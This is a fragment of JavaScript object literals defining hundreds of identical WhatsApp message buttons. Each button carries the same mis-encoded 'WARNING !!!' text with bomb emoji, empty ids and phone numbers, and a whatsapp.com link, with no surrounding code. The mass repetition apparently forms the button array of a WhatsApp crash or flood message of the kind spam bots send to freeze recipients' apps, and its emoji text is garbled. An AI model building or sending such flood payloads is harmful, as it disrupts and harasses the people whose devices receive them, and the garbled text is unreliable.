{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
